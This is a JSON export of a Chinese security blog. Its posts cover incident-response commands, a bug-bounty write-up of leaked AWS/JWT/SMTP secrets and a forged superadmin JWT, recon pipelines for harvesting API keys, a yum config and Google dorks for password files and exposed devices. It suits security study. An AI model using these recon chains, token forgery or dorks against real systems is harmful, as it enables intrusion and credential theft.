{"meta":{"title":"坤坤后花园","subtitle":"坤坤后花园''","description":"人生得意须尽欢，莫使金樽空对月","author":"cury","url":"https://cury-w.github.io","root":"/"},"pages":[{"title":"about","date":"2025-06-13T08:54:51.000Z","updated":"2025-06-23T08:36:18.950Z","comments":false,"path":"about/index.html","permalink":"https://cury-w.github.io/about/index.html","excerpt":"","text":"带带弟弟"}],"posts":[{"title":"应急溯源命令","slug":"应急溯源命令","date":"2025-07-01T02:28:56.000Z","updated":"2025-07-01T02:38:11.104Z","comments":true,"path":"2025/07/01/应急溯源命令/","link":"","permalink":"https://cury-w.github.io/2025/07/01/%E5%BA%94%E6%80%A5%E6%BA%AF%E6%BA%90%E5%91%BD%E4%BB%A4/","excerpt":"","text":"HW应急溯源：50个高级命令实战指南在攻防对抗中，快速精准的应急溯源能力是防守方的核心武器。本文整理出50个实战中真正高频使用的高级命令组合，助你提升溯源效率。 一、日志深度分析与关联 多日志源联合检索 1# 跨系统日志关联（Syslog+Apache）zgrep -h &quot;192.168.1.100&quot; /var/log/syslog* /var/log/apache2/access.log* | awk -F&#x27;[][]&#x27;&#x27;&#123;gsub(/:/,&quot; &quot;); print $1,$2,$(NF-1),$NF&#125;&#x27; |sort -k4 SSH暴力破解行为分析 1# 识别高频攻击源cat /var/log/auth.log* | grep &quot;Failed password&quot; | awk &#x27;&#123;print $11&#125;&#x27; | sort | uniq -c | sort -nr | awk &#x27;$1&gt;10 &#123;print &quot;iptables -A INPUT -s &quot;$2&quot; -j DROP&quot;&#125;&#x27; Web攻击特征提取 1# 提取SQL注入攻击载荷zcat /var/log/nginx/access.log.*.gz |perl -ne &#x27;print if /(\\%27|\\&#x27;)|(\\%3D|=).*(\\-\\-|\\%23|\\#)/i&#x27; |cut -d&#x27;&quot;&#x27; -f2,6 二、网络取证与流量分析 实时异常连接监控 1# 检测异常外联（含进程名）lsof -i -n -P | awk &#x27;!/127.0.0.1|::1/ &amp;&amp; $5==&quot;TCP&quot; &amp;&amp; $8!~/LISTEN/ &#123;split($7,proc,&quot;/&quot;); print $9,proc[1]&#125;&#x27; |sort -u PCAP深度包解析 1# 提取DNS隐蔽隧道特征tshark -r traffic.pcap -Y &quot;dns&quot; -T fields -e frame.time -e ip.src -e dns.qry.name |awk &#x27;$3 ~ /[a-f0-9]&#123;16&#125;\\.evil\\.com/ &#123;print &quot;Malicious DNS: &quot;$3&#125;&#x27; 加密流量会话重组 1# 提取TLS会话密钥（需提前配置）tcpdump -ni eth0 -s0 -w - &#x27;tcp port 443&#x27; | tee https.pcap | tshark -o &quot;tls.keylog_file:sslkeys.txt&quot; -r - 三、内存取证高级技巧 恶意进程链分析 1volatility -f memory.dump --profile=Win10x64 pstree |awk &#x27;/explorer.exe/ &#123;pid=$2; getline; while($0~/^[ ]&#123;4&#125;/)&#123;if(/cmd.exe/)&#123;print &quot;Suspicious chain:&quot;,$0&#125;&#125; pid=&quot;&quot;&#125;&#x27; 无文件攻击检测 1# 检测进程空洞注入volatility -f memory.dump --profile=Win2016 malfind -D dump_dir |grep -E &quot;MZ.&#123;10,&#125;PE&quot; -B 5 |awk &#x27;/Process/ &#123;print $2&quot;:&quot;$4&#125; /VAD/ &#123;print &quot;-&gt; &quot;$3&#125;&#x27; 注册表持久化分析 1volatility -f memory.dump --profile=Win7SP1 printkey -K &quot;Software\\Microsoft\\Windows\\CurrentVersion\\Run&quot; |grep -A 5 &quot;REG_&quot; |perl -ne &#x27;print if /Last Write Time/../Data:/&#x27; 四、文件系统深度检查 隐藏文件深度扫描 1# 检测时间戳伪造find / -type f -printf&quot;%i|%p|%TY-%Tm-%Td %TT|%AY-%Am-%Ad %AT\\n&quot; |awk -F&#x27;|&#x27;&#x27;$3!=$4 &#123;print &quot;Timestamp anomaly:&quot;,$2&#125;&#x27; ELF文件异常检测 1# 检查动态链接库劫持for f in $(find /usr/bin -type f); do ldd $f | awk &#x27;/not found/ &#123;print &quot;[&quot;$1&quot;] missing in &quot;$0&#125;&#x27;done 快速哈希比对 1# 自动化基准校验find /bin /sbin /usr/bin -type f -execsha256sum &#123;&#125; + |diff - baseline.sha256 |grep &#x27;^&gt;&#x27; | cut -c3- 五、系统行为监控 进程行为监控 1# 跟踪进程系统调用strace -ff -e trace=file,network -p $(pgrep -f suspicious_process) 2&gt;&amp;1 |tee /tmp/proc_mon.log 文件实时监控 1# 多目录深度监控inotifywait -m -r --format &#x27;%T %e %w%f&#x27; --timefmt &#x27;%F_%T&#x27; /etc /bin 2&gt;&amp;1 |grep -E &quot;(MODIFY|CREATE|DELETE)&quot; 内核模块检测 1# 检测隐藏LKMdiff &lt;(lsmod | awk &#x27;&#123;print $1&#125;&#x27;) &lt;(grep -v &quot;^#&quot; /proc/modules | awk &#x27;&#123;print $1&#125;&#x27;) |grep &#x27;&gt;&#x27; | cut -c3- 六、自动化响应处置 攻击者环境隔离 1# 自动化蜜罐重定向iptables -t nat -A PREROUTING -s $(cat attacker_ips.txt) -j DNAT --to-destination 10.0.0.99 恶意文件批量处置 1# 安全删除并记录whileread -r file; do shred -v -n 3 -z &quot;$file&quot; echo&quot;$(date) | $(sha256sum &quot;$file&quot;)&quot; &gt;&gt; /audit/file_erase.logdone &lt; malware_list.txt 应急快照创建 1# 系统状态全量采集systemctl list-units --type=service &gt; service_state.logcrontab -l &gt; cron_backup.txtnetstat -tulnpe &gt; netstat.logtar czf /backup/forensic_$(date +%s).tar.gz *.log 七、Windows环境专用 PowerShell日志提取 1Get-WinEvent-LogName&quot;Microsoft-Windows-PowerShell/Operational&quot; | Where-Object &#123;$_.Id -eq4104&#125; | Select-Object TimeCreated, Message WMI持久化检测 1wmic /NAMESPACE:\\\\root\\subscription PATH __EventFilter GET Namewmic /NAMESPACE:\\\\root\\subscription PATH CommandLineEventConsumer GET ExecutablePath 异常计划任务扫描 1Get-ScheduledTask | Where-Object &#123;$_.State -ne&quot;Disabled&quot;&#125; | Select-Object TaskName, @&#123;N=&quot;Command&quot;;E=&#123;$_.Actions.Execute&#125;&#125; 八、云环境特殊操作 AWS API异常检测 1aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=ConsoleLogin \\--query &#x27;Events[].CloudTrailEvent&#x27; --output text |jq -r &#x27;select(.userIdentity.type == &quot;Root&quot;) | .eventTime&#x27; K8s异常Pod检测 1kubectl get pods -A -o json | jq -r &#x27;.items[] | select(.status.containerStatuses[].restartCount&gt;5) | .metadata.name&#x27; 九、数据库取证 MySQL登录审计 1SELECT user_host, event_time FROM mysql.general_log WHERE command_type=&#x27;Connect&#x27;AND argument LIKE&#x27;%admin%&#x27;ORDERBY event_time DESCLIMIT 50; PostgreSQL对象变更 1SELECT*FROM pg_audit WHERE object_type IN (&#x27;TABLE&#x27;,&#x27;FUNCTION&#x27;) AND statement_type=&#x27;DDL&#x27; 十、综合溯源分析 攻击时间线重建 1# 多源日志合并排序(find /var/log -name &quot;*.log&quot; -execcat &#123;&#125; +; journalctl -q --since &quot;2 hours ago&quot;) | grep -E &quot;fail|error|warning&quot; | sort -k 3 跨主机关联分析 1# 分布式日志检索parallel-ssh -h hostlist.txt &quot;grep &#x27;2023-07-15T14&#x27; /var/log/secure&quot; | awk &#x27;/FAILED LOGIN/&#123;ip[$8]++&#125; END&#123;for(i in ip) print ip[i],i&#125;&#x27; | sort -nr 十一、反混淆技术 PowerShell解码 1[System.Text.Encoding]::UTF8.GetString( [System.Convert]::FromBase64String($encodedString) JavaScript美化 1js-beautify -r -f obfuscated.js -o cleaned.js 十二、深度内存分析 DLL注入检测 1volatility -f memory.img --profile=Win10x64 ldrmodules | awk &#x27;$4==&quot;False&quot; || $5==&quot;False&quot; || $6==&quot;False&quot; &#123;print &quot;PID:&quot;$2&quot; -&gt; &quot;$1&#125;&#x27; API Hook检测 1volatility -f memory.img --profile=Win7SP1 apihooks -p 1244 | grep -A 5 &quot;Hook mode&quot; | perl -0pe &#x27;s/\\n\\s+/ /g&#x27; 十三、网络层高级分析 TCP会话重组 1tcprewrite --infile=raw.pcap --outfile=ordered.pcap --fixcsum DNS隧道检测 1tshark -r dns.pcap -Y &quot;dns&quot; -T fields -e dns.qry.name | awk -F. &#x27;&#123;len=0; for(i=1;i&lt;=NF;i++) len+=length($i); if(len&gt;100) print &quot;Suspicious: &quot;$0&#125;&#x27; 十四、文件签名校验 PE文件验证 1osslsigncode verify -in suspicious.exe | grep -E &quot;Signature|Not After&quot; 证书链验证 1openssl s_client -connect target.com:443 -showcerts 2&gt;/dev/null | openssl x509 -noout -dates -issuer 十五、日志规范化处理 多格式时间转换 1date -d &quot;$(echo &quot;Jul 15 14:22&quot; | sed &#x27;s/ /-/g&#x27;)&quot; +&quot;%Y-%m-%dT%H:%M:%S&quot; 日志字段提取 1awk &#x27;&#123;match($0,/client: (\\S+)/,a); print a[1]&#125;&#x27; /var/log/nginx/access.log 十六、安全配置核查 Linux加固检查 1# 检查危险权限文件find / -xdev \\( -perm -4000 -o -perm -2000 \\) -type f -execls -ld &#123;&#125; + Windows策略审计 1Get-ItemProperty&quot;HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\Firewall\\StandardProfile&quot; 十七、隐蔽信道检测 ICMP隧道识别 1tcpdump -ni eth0 &quot;icmp[icmptype]==icmp-echo&quot; -vv | awk &#x27;length($0) &gt; 200 &#123;print &quot;Large ICMP packet from: &quot;$3&#125;&#x27; HTTP隐蔽隧道 1tshark -r web.pcap -Y &quot;http&quot; -T fields -e http.request.uri | perl -ne &#x27;print if /[a-f0-9]&#123;32&#125;/i&#x27; 十八、自动化报告生成 证据摘要生成 1echo&quot;## Forensic Report $(date)&quot; &gt; report.mdfor f in *.log; do echo&quot;### $&#123;f%.*&#125;&quot; &gt;&gt; report.md grep -c &quot;ERROR&quot;&quot;$f&quot; | xargs echo&quot;- Error count: &quot; &gt;&gt; report.mddone 十九、反取证对抗 时间戳反篡改 1# 获取文件原始MAC时间stat -c &quot;%n|%x|%y|%z&quot; target_file | tee -a timeline.log 日志完整性校验 1# 创建日志密封点sha256sum /var/log/*.log &gt; $(date +%s).seal 二十、企业级溯源架构 分布式日志收集 1# 使用rsyslog加密传输echo&quot;*.* @@(o)logserver.example.com:6514&quot; &gt; /etc/rsyslog.d/secure.confsystemctl restart rsyslog ELK攻击图谱 1event.type:&quot;attack&quot; AND destination.ip:* | graph-tabular neighbor_direction=both 二十一、硬件级取证 固件提取 1flashrom -p linux_spi:dev=/dev/spidev0.0 -r bios.bin UEFI安全扫描 1CHIPSEC --module common.uefi.s3bootscript 二十二、移动终端取证 Android数据提取 1adb shell content query --uri content://sms/inbox iOS备份解析 1python3 ios_backup_parser.py -b backup -o output 关键操作原则 \\1. 操作前取证：重要系统执行dd if=/dev/sda of=/evidence/disk.img \\2. 命令可审计：所有操作记录于script -t 2&gt; timing.log -a session.log \\3. 证据链完整：使用sha256sum evidence.img &gt; evidence.sha256 \\4. 最小干扰原则：优先使用lsof -nPi +c 0避免写操作 某金融企业实战案例：通过volatility -f mem.dump yarascan -Y &quot;MZ&quot;检测到内存中的无文件攻击，结合tshark -r pcap -Y &quot;dns&quot; -e dns.qry.name发现C2通信，最终溯源至攻击者基础设施。 没有银弹的命令，真正的溯源能力在于： • 对系统底层的深刻理解（strace&#x2F;dtrace） • 网络协议的精准解读（tcpdump高级过滤） • 日志信息的关联分析（跨设备日志拼接） • 攻击者心理的预判（攻击路径重建） 注意：所有命令需在授权环境下测试验证，生产环境调整参数前务必进行沙箱测试。 通过这50个命令的灵活组合，可覆盖90%以上的HW溯源场景。但切记： \\1. 理解优于记忆：每个参数的含义比命令本身更重要 \\2. 场景决定工具：根据实际环境调整命令组合 \\3. 自动化需谨慎：关键操作必须人工复核 \\4. 法律红线：所有操作严格遵守《网络安全法》规定","categories":[],"tags":[{"name":"应急溯源","slug":"应急溯源","permalink":"https://cury-w.github.io/tags/%E5%BA%94%E6%80%A5%E6%BA%AF%E6%BA%90/"}]},{"title":"404如何继续渗透","slug":"404如何继续渗透","date":"2025-06-30T07:05:49.000Z","updated":"2025-06-30T07:12:05.521Z","comments":true,"path":"2025/06/30/404如何继续渗透/","link":"","permalink":"https://cury-w.github.io/2025/06/30/404%E5%A6%82%E4%BD%95%E7%BB%A7%E7%BB%AD%E6%B8%97%E9%80%8F/","excerpt":"","text":"从404到获取权限：通过api路由获得生产密钥人生教训 #210：仅仅因为某个东西返回 404 并不意味着它已经死了——有时它只是需要正确的耳语……或精心设计的 cURL。🤯 我不知道一个简单的 404 会成为我进入生产库的金票。 🧠 设置：当 Recon 成为现实时在 SaaS 平台上进行一些大规模侦察时，我偶然发现了一个未经身份验证的子域： 1https://api-dev.targetcompany.com 看起来很无聊。我用一些通用路径来探测它： 123/api/v1/users/api/v1/admin/api/v1/config 一切都回到了 404。或者我是这么想的。 但是我的爬虫脚本标记了一件奇怪的事情： 1GET /api/v1/internal/statusResponse: 404 Not Found (but with a 500ms delay) 🔍 深入探讨：冰壶幻影我手动点击它： 1curl -i https://api-dev.targetcompany.com/api/v1/internal/status 仍然是 404。但标头暴露了它： 1x-powered-by: expressx-env: production 这不是一个开发服务器。这是从 dev 子域公开 prod 配置。 🕴️ 发现阶段：Fuzz Till You Drop是时候做手术了。 我沿着小路跑：ffuf /api/v1/internal/ 1ffuf -u https://api-dev.targetcompany.com/api/v1/internal/FUZZ -w wordlist.txt -mc 200,403,500 -ac /api/v1/internal/env /api/v1/internal/secrets /api/v1/internal/creds 直到我发送了一个请求：/secrets 1curl https://api-dev.targetcompany.com/api/v1/internal/secrets 响应： 1&#123; &quot;aws_key&quot;: &quot;AKIAIOSFODNN7EXAMPLE&quot;, &quot;aws_secret&quot;: &quot;wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY&quot;, &quot;jwt_secret&quot;: &quot;thisisnotsosecret123&quot;, &quot;smtp_user&quot;: &quot;alerts@targetcompany.com&quot;, &quot;smtp_pass&quot;: &quot;SuperSecret123!&quot;&#125; 这是完全的 prod 凭证泄漏 — 来自一个本应删除但在 404 掩码后面保持开放状态的端点。 🚀 武器化：从 Leak 到 Pwn借助 AWS 信誉，我验证了访问权限： 1aws configure 有效。 1aws iam list-users 完全管理员访问权限。我可以： 列出 S3 存储桶 旋转 EC2 实例 查看日志 从他们的域发送 SMTP 电子邮件 使用 ，我伪造了管理员令牌：jwt_secret 1import jwtpayload = &#123;&quot;user&quot;: &quot;admin&quot;, &quot;role&quot;: &quot;superadmin&quot;&#125;token = jwt.encode(payload, &quot;thisisnotsosecret123&quot;, algorithm=&quot;HS256&quot;)print(token) 用于： 1GET /dashboard HTTP/1.1Authorization: Bearer &lt;forged_token&gt; 🚫 没有 2FA。无需额外验证。完全访问权限。 我现在是他们内部门户的管理员。🧹 我如何将 403 Forbidden 变成金矿 🚀免费链接🎈infosecwriteups.com 📊 根本原因：幽灵端点事实证明，这些路由本应在暂存期间删除，但仅在前端被注释掉。/api/v1/internal/* 当路由逻辑失败但端点本身存在时，后端仍然用误导性的 404 暴露它们。 开发逻辑： 1if (!user) return 404; // instead of 403 🖊️ 最终 PoC 摘要：目标： https://api-dev.targetcompany.com/api/v1/internal/secrets 使用的技术：路由泄露 + 误导性 404 + 未经身份验证的访问 + 凭据泄露 AWS 完全访问权限 SMTP 欺骗 JWT 身份验证绕过 敏感信息泄露","categories":[],"tags":[{"name":"404","slug":"404","permalink":"https://cury-w.github.io/tags/404/"}]},{"title":"js的发现和利用","slug":"js的发现和利用","date":"2025-06-30T03:31:55.000Z","updated":"2025-06-30T03:37:44.240Z","comments":true,"path":"2025/06/30/js的发现和利用/","link":"","permalink":"https://cury-w.github.io/2025/06/30/js%E7%9A%84%E5%8F%91%E7%8E%B0%E5%92%8C%E5%88%A9%E7%94%A8/","excerpt":"","text":"漏洞赏金的JavaScript枚举：像专业人士一样揭露隐藏的端点和秘密！JavaScript 文件绝对是 漏洞赏金猎人的金矿，通常会泄露隐藏的 API 端点、敏感密钥和管理路径。如果您跳过 JS 枚举，那么您将错过高价值目标和巨额赏金！ 💰 1️ 在 Target 🎯 上查找 JavaScript 文件 A 通用方法（使用 CLI 工具） 1234567891011121314# Get all JavaScript files from a target using gau (GetAllURLs)gau target.com | grep &quot;\\.js&quot; | tee js_files.txt# Extract JS file URLs from Wayback Machinewaybackurls target.com | grep &quot;\\.js&quot; | tee js_wayback.txt# Use katana for fast crawlingkatana -u https://target.com -jc -silent | tee js_katana.txt# Combine all JS sourcesecho target.com | subfinder | httpx -silent | gau | grep &quot;\\.js&quot; | anew all_js.txt# Extract JS links from robots.txtcurl -s https://target.com/robots.txt | grep &quot;\\.js&quot; | awk &#x27;&#123;print $NF&#125;&#x27; | tee js_robots.txt 年度方法 ： 检查 Page Source （） → 查找标签。Ctrl + U``&lt;script&gt; 使用“网络”选项卡 （） →检查从外部源加载的 JS 文件 （） （）。F12 → Sources 使用 Burp Suite Spidering 查找隐藏的 JS 文件。 2️ 从JavaScript中提取端点和API密钥 使用 LinkFinder 提取端点 1cat js_files.txt | xargs -I&#123;&#125; python3 ~/tools/LinkFinder/linkfinder.py -i &#123;&#125; -o li | tee endpoints.txt 使用SecretFinder查找API密钥和秘密 1cat js_files.txt | xargs -I&#123;&#125; python3 ~/tools/SecretFinder/SecretFinder.py -i &#123;&#125; -o cli | tee secrets.txt 使用 GF （grep 模式） 查找有趣的模式 1234cat js_files.txt | gf apikeys | tee api_keys.txtcat js_files.txt | gf aws-keys | tee aws_keys.txtcat js_files.txt | gf json | tee json_leaks.txtcat js_files.txt | gf urls | tee urls.txt 使用 grep 手动搜索敏感数据1grep -E -o &quot;(apiKey|authToken|client_secret|accessToken)[\\&quot;&#x27;= ]+[^\\&quot;&#x27; ]+&quot; js_files.txt | tee found_keys.txt 3️ 实现最高效率的链式工具 在一个命令中查找JavaScript文件并提取端点 1gau target.com | grep &quot;\\.js&quot; | tee js_files.txt &amp;&amp; cat js_files.txt | xargs -I&#123;&#125; python3 ~/tools/LinkFinder/linkfinder.py -i &#123;&#125; -o cli | tee endpoints.txt 同时查找JavaScript文件并提取API密钥 1gau target.com | grep &quot;\\.js&quot; | anew js_files.txt &amp;&amp; cat js_files.txt | gf apikeys | tee api_keys.txt 使用多种工具的完整侦察管道 1echo target.com | subfinder | httpx -silent | gau | grep &quot;\\.js&quot; | anew js_files.txt &amp;&amp; cat js_files.txt | xargs -I&#123;&#125; python3 ~/tools/LinkFinder/linkfinder.py -i &#123;&#125; -o cli | tee endpoints.txt &amp;&amp; cat js_files.txt | gf apikeys | tee api_keys.txt 4️ 利用提取的端点提取 API 端点后，测试它们是否存在漏洞： 测试 API 端点以实现开放访问 1cat endpoints.txt | httpx -silent -status-code -title -tech-detect API 参数的模糊测试（使用 ffuf） 1ffuf -u https://target.com/FUZZ -w endpoints.txt -mc 200 -fs 0 测试 IDOR（不安全的直接对象引用） 1cat endpoints.txt | qsreplace &quot;1234&quot; | xargs -I&#123;&#125; curl -X GET -H &quot;Authorization: Bearer invalidtoken&quot; &#123;&#125; 检查开放目录和敏感文件 1cat endpoints.txt | ffuf -u https://target.com/FUZZ -w ~/wordlists/directory-list.txt -mc 200 5️ 在 VPS 上自动枚举 JavaScript （24&#x2F;7 Recon）在 VPS 上运行 cron 作业以持续监控新的 JavaScript 文件并自动提取密钥。 为 JS 枚举设置 cron 作业 1echo &quot;0 * * * * gau target.com | grep &#x27;.js&#x27; | anew js_files.txt &amp;&amp; cat js_files.txt | gf apikeys | tee api_keys.txt&quot; | crontab - 接收 API 密钥泄露的 Telegram 通知 1while true; do cat api_keys.txt | notify -bulk; sleep 3600; done 更聪明地破解，而不是更难！","categories":[],"tags":[{"name":"js","slug":"js","permalink":"https://cury-w.github.io/tags/js/"}]},{"title":"centos7-yum源","slug":"centos7-yum源","date":"2025-06-26T00:42:59.000Z","updated":"2025-06-26T01:06:47.733Z","comments":true,"path":"2025/06/26/centos7-yum源/","link":"","permalink":"https://cury-w.github.io/2025/06/26/centos7-yum%E6%BA%90/","excerpt":"","text":"yum源备份cd /etc/yum.repos.d &amp;&amp; mv CentOS-Base.repo CentOS-Base.repo_bk # 如果找不到，看下具体文件名 * 如果仍然无法更新，删除所有yum源rm -rf *.repo 新建yum源12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970# CentOS-Base.repo## The mirror system uses the connecting IP address of the client and the# update status of each mirror to pick mirrors that are updated to and# geographically close to the client. You should use this for CentOS updates# unless you are manually picking other mirrors.## If the mirrorlist= does not work for you, as a fall back you can try the # remarked out baseurl= line instead.## [base]name=CentOS-$releasever - Base - mirrors.aliyun.comfailovermethod=prioritybaseurl=http://mirrors.aliyun.com/centos/$releasever/os/$basearch/ http://mirrors.aliyuncs.com/centos/$releasever/os/$basearch/ http://mirrors.cloud.aliyuncs.com/centos/$releasever/os/$basearch/gpgcheck=1gpgkey=http://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-7 #released updates [updates]name=CentOS-$releasever - Updates - mirrors.aliyun.comfailovermethod=prioritybaseurl=http://mirrors.aliyun.com/centos/$releasever/updates/$basearch/ http://mirrors.aliyuncs.com/centos/$releasever/updates/$basearch/ http://mirrors.cloud.aliyuncs.com/centos/$releasever/updates/$basearch/gpgcheck=1gpgkey=http://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-7 #additional packages that may be useful[extras]name=CentOS-$releasever - Extras - mirrors.aliyun.comfailovermethod=prioritybaseurl=http://mirrors.aliyun.com/centos/$releasever/extras/$basearch/ http://mirrors.aliyuncs.com/centos/$releasever/extras/$basearch/ http://mirrors.cloud.aliyuncs.com/centos/$releasever/extras/$basearch/gpgcheck=1gpgkey=http://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-7 #additional packages that extend functionality of existing packages[centosplus]name=CentOS-$releasever - Plus - mirrors.aliyun.comfailovermethod=prioritybaseurl=http://mirrors.aliyun.com/centos/$releasever/centosplus/$basearch/ http://mirrors.aliyuncs.com/centos/$releasever/centosplus/$basearch/ http://mirrors.cloud.aliyuncs.com/centos/$releasever/centosplus/$basearch/gpgcheck=1enabled=0gpgkey=http://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-7 #contrib - packages by Centos Users[contrib]name=CentOS-$releasever - Contrib - mirrors.aliyun.comfailovermethod=prioritybaseurl=http://mirrors.aliyun.com/centos/$releasever/contrib/$basearch/ http://mirrors.aliyuncs.com/centos/$releasever/contrib/$basearch/ http://mirrors.cloud.aliyuncs.com/centos/$releasever/contrib/$basearch/gpgcheck=1enabled=0gpgkey=http://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-7[epel]name=Extra Packages for Enterprise Linux 7 - $basearchbaseurl=http://download.fedoraproject.org/pub/epel/7/$basearch#mirrorlist=https://mirrors.fedoraproject.org/metalink?repo=epel-7&amp;arch=$basearchfailovermethod=priorityenabled=1gpgcheck=1gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-EPEL-7 生成yum缓存 &amp; 更新yum makecache &amp;&amp; yum -y update 等待更新完成即可","categories":[],"tags":[{"name":"centos7","slug":"centos7","permalink":"https://cury-w.github.io/tags/centos7/"}]},{"title":"googlehacking","slug":"googlehacking","date":"2025-06-24T05:14:13.000Z","updated":"2025-06-24T05:15:27.368Z","comments":true,"path":"2025/06/24/googlehacking/","link":"","permalink":"https://cury-w.github.io/2025/06/24/googlehacking/","excerpt":"","text":"首选：site:xxx.edu.cn 初始密码&#x2F;密码&#x2F;登录&#x2F;用户手册&#x2F;操作说明…… site:hueb.edu.cn filetype:xls 学号&#x2F;sfz…… 一、完整 Google Hacking 语法列表1. 基础操作符 操作符 说明 示例 site: 限定搜索特定域名或子域名 site:example.com intitle: 标题包含关键词 intitle:”login” allintitle: 标题包含所有指定关键词 allintitle:”admin” “dashboard” inurl: URL 路径包含关键词 inurl:&#x2F;admin allinurl: URL 路径包含所有指定关键词 allinurl:login.php?user&#x3D; filetype: 搜索特定文件类型 filetype:pdf “confidential” ext: 按文件扩展名搜索（同 filetype:） ext:sql “password” intext: 正文内容包含关键词 intext:”数据库密码” allintext: 正文包含所有指定关键词 allintext:”username” “password” cache: 查看 Google 缓存的页面 cache:example.com related: 查找类似网站 related:github.com info: 获取网站的 Google 摘要信息 info:example.com define: 搜索词语定义 define:SQL注入 2. 逻辑操作符 操作符 说明 示例 AND 或空格 同时满足多个条件 site:example.com 密码 OR 满足任意一个条件 漏洞 OR 后门 - 排除关键词 登录 -site:example.com () 组合复杂逻辑 (inurl:admin OR intitle:admin) -论坛 3. 高级操作符 操作符 说明 示例 * 通配符（匹配任意字符） “username:* password:*“ “…” 精确匹配短语 “您的密码错误” .. 数值范围搜索 价格 $100..$500 AROUND(N) 关键词间距不超过 N 个词 “密码” AROUND(5) “泄露” weather: 搜索某地天气 weather:北京 stocks: 搜索股票代码 stocks:GOOG 4. 隐藏功能 功能 说明 示例 时间筛选 限定时间范围（通过搜索工具栏） 最近一年、自定义日期 图片搜索 通过图片反向搜索敏感信息 上传图片查找来源 地图数据 搜索暴露的地理标记信息 intitle:”security camera” site:google.com&#x2F;maps 二、组合示例大全（按场景分类）1. 敏感文件泄露 场景 示例 说明 数据库备份 filetype:sql “DROP TABLE” site:example.com 搜索 SQL 备份文件 配置文件 intitle:”index of” “config.php” 查找 PHP 配置文件 日志文件 ext:log “error” “password” 包含密码的日志文件 密钥文件 filetype:key private 私钥文件泄露 2. 后台与登录页面 场景 示例 说明 管理员后台 intitle:”admin login” inurl:&#x2F;admin 未授权访问的管理页面 默认密码 “默认密码” site:routerlogin.net 设备默认凭据 弱口令提示 intext:”用户名或密码错误” inurl:login 登录页面错误信息 3. 漏洞利用 场景 示例 说明 SQL 注入点 inurl:”id&#x3D;” &amp; intext:”Warning: mysql” 存在报错信息的注入点 目录遍历 intitle:”index of &#x2F;“ “parent directory” 开放目录列表 API 接口暴露 inurl:&#x2F;api&#x2F;v1 intext:”apikey” 泄露的 API 密钥 4. 设备与系统 场景 示例 说明 网络摄像头 inurl:&#x2F;view.shtml intitle:”Live View” 公开的摄像头流 路由器管理 intitle:”RouterOS” “admin” 未授权的路由器配置页面 打印机控制台 inurl:”&#x2F;hp&#x2F;device&#x2F;this.LCDispatcher” 惠普打印机管理界面 5. 开源情报（OSINT） 场景 示例 说明 员工信息 site:linkedin.com “CTO” “example.com” 通过 LinkedIn 收集员工职位 文档元数据 filetype:docx “作者：张三” 从 Office 文档提取创建者信息 GitHub 泄露 “github.com” “password” extension:env GitHub 中的敏感环境变量文件 6. 错误信息泄露 场景 示例 说明 调试模式 intext:”DEBUG MODE” “PHP” 开启调试模式的网站 数据库报错 “ORA-12541: TNS 无监听程序” Oracle 数据库错误信息 堆栈跟踪 intext:”at java.lang.Thread” Java 应用崩溃日志 三、高阶组合技巧1. 通配符与模糊搜索 搜索带参数的 URL：inurl:*.php?id&#x3D; * 查找密码重置链接：“password reset” site:example.com inurl:token&#x3D;* 2. 时间范围限定 查找近期泄露的数据库：filetype:sql “INSERT INTO users” after:2023-01-01 3. 混合逻辑精准定位 排除干扰结果：(intitle:”管理后台” OR inurl:&#x2F;admin) -site:gov.cn 组合文件类型与关键词：filetype:xls “员工工资” site:example.com 4. 利用错误消息 发现 SQL 注入漏洞：“You have an error in your SQL syntax” 识别配置错误：“Access denied for user ‘root‘@’localhost’” 四、防御建议（补充） robots.txt 配置：禁止爬虫访问敏感路径（如 &#x2F;admin、&#x2F;config）。 文件权限控制：避免将备份文件（.bak、.sql）存放在 Web 目录。 错误信息隐藏：自定义错误页面，避免暴露堆栈跟踪。 定期搜索自身：用 site:yourdomain.com 检查公开信息泄露。 五、工具增强 Google Dork 自动化： GHDB：直接搜索预定义的漏洞语法。 DorkGenius：自动生成高级 Dork 语句。 监控与告警： 使用 Google Alerts 监控公司关键词（如 site:example.com password）。 六、合法与道德提醒 仅用于授权测试：渗透前需获得书面许可。 漏洞报告：发现漏洞后联系管理员，参考《漏洞披露规范》。 避免敏感数据：示例中的关键词均为演示用途，请勿针对真实系统测试。 七、语法解析与示例1. index of &#x2F;admin 用途：搜索开放目录列表中的 &#x2F;admin 目录（常见管理后台路径）。 风险：暴露后台登录页面、未授权访问管理界面。 防御：禁用目录列表（Apache: Options -Indexes），设置访问权限（如 IP 白名单）。 2. index of &#x2F;passwd 用途：查找 Unix&#x2F;Linux 系统中的 &#x2F;etc&#x2F;passwd 文件（用户账户信息）。 风险：泄露用户名、UID&#x2F;GID 等敏感信息（现代系统密码存储在 &#x2F;etc&#x2F;shadow）。 防御：确保 &#x2F;etc&#x2F;passwd 文件权限为 644，禁止 Web 访问系统文件。 3. index of &#x2F;password 用途：搜索包含 “password” 关键词的目录或文件（如明文密码文件）。 风险：直接获取明文密码或哈希值。 防御：避免在代码或文件中明文存储密码，使用环境变量或密钥管理服务。 4. index of &#x2F;mail 用途：查找邮件服务器或邮件存储目录（如 &#x2F;var&#x2F;mail）。 风险：泄露用户邮件内容、账户信息。 防御：限制邮件目录的 Web 访问权限，加密存储敏感数据。 5. “index of &#x2F;“ +passwd 用途：在根目录下搜索 passwd 文件。 示例结果：可能发现 &#x2F;etc&#x2F;passwd 被错误链接到 Web 根目录。 防御：检查 Web 目录中是否存在符号链接到系统文件。 6. “index of &#x2F;“ +password.txt 用途：查找 Web 根目录下的 password.txt 文件。 风险：明文密码文件可直接下载。 防御：删除测试或临时文件，禁用目录列表。 7. “index of &#x2F;“ +.htaccess 用途：暴露 Apache 服务器的 .htaccess 配置文件。 风险：泄露重定向规则、认证凭据（如 AuthUserFile 路径）。 防御：限制 .htaccess 文件权限（如 600），避免存储敏感信息。 8. “index of &#x2F;root” 用途：搜索 Unix 系统超级用户（root）的主目录。 风险：泄露 root 用户的 SSH 